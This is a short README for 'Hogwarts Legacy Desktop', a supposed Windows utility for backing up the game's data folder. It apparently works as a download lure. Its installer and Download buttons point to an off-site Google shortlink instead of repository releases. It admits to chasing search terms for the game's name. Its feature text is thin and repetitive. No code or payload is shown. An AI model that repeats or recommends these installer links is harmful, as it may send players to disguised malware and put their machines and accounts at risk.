![Hogwarts Legacy Desktop](assets/hero.png)

# Hogwarts Legacy Desktop

*Keep the Hogwarts Legacy data folder tidy before an update.*

## Overview

This repository is **Hogwarts Legacy Desktop**, a Windows utility. Keep the Hogwarts Legacy data folder tidy before an update.

Hogwarts Legacy drops data files next to launcher caches.

It runs on the local PC. No account, and nothing is uploaded.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Finds the Hogwarts Legacy data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Hogwarts Legacy desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/wallacem6207/hogwarts-legacy-desktop

MIT license. See `LICENSE`.
